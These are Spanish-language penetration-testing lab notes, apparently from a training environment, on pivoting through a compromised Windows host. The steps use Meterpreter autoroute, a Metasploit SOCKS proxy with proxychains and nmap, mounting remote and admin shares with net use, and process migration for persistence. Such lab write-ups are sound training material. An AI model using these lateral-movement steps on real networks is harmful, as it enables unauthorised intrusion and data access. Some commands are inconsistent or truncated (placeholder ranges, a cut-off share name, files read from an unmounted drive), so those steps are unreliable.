# Pivoting y Detección de Máquinas No Alcanzables vía Intermedia

## Objetivo

Acceder a una máquina interna no accesible directamente desde nuestra máquina atacante utilizando una sesión de `meterpreter` como puente (pivoting) y herramientas como `proxychains`, `socks_proxy`, `nmap` y `net use`.

---

## 1. Identificar redes internas desde la máquina intermedia

Desde la sesión `meterpreter` activa:

```bash
ipconfig
```

> Esto mostrará interfaces y posibles rangos internos.

---

## 2. Verificar accesibilidad con ping

Aún desde `meterpreter`, probar direcciones IP internas:

```bash
run post/windows/gather/ping_sweep RHOSTS=ip/24
```

---

## 3. Crear ruta hacia la red interna con autoroute

```bash
run autoroute -s ip/20
```

> Esto añade una ruta de red en Metasploit hacia el segmento 10.0.28.125/20 por la sesión actual.

---

## 4. Configurar proxychains

En tu máquina atacante, visualizar configuración:

```bash
cat /etc/proxychains4.conf
```

Verifica que incluya la línea:

```bash
socks4 127.0.0.1 9050
```

---

## 5. Crear el servidor SOCKS en Metasploit

```bash
background
use auxiliary/server/socks_proxy
show options
set SRVPORT 9050
set VERSION 4a
exploit
```

> Esto crea un proxy SOCKS que permite enrutar tráfico por la máquina intermedia.

---

## 6. Usar Nmap a través del proxy

Desde tu máquina atacante:

```bash
proxychains nmap demo1.ine.local -sT -Pn -sV -p 445
```

> Esto escanea la máquina objetivo a través del túnel creado.

---

## 7. Reabrir sesión de meterpreter

```bash
jobs
sessions -i 1
```

---

## 8. Enumerar recursos compartidos (net view)

Desde `meterpreter`:

```bash
shell
net view 10.0.28.125
```

---

## 9. Migrar a proceso con más privilegios (opcional)

```bash
CTRL + C
migrate -N explorer.exe
shell
```

---

## 10. Montar recursos remotos

Montar carpetas compartidas:

```bash
net view 10.0.28.125
net use W: \\10.0.28.125\W...
net use A: \\10.0.28.125\A$
```

---

## 11. Leer archivos compartidos

```bash
cat D:\\loquesea.txt
cat D:\\loquesea.txt
```


- Requiere privilegios suficientes para ejecutar `net use`.
- `proxychains` solo enruta aplicaciones compatibles con SOCKS (como Nmap).
- Para mantener persistencia, se recomienda migrar a procesos estables como `explorer.exe`.

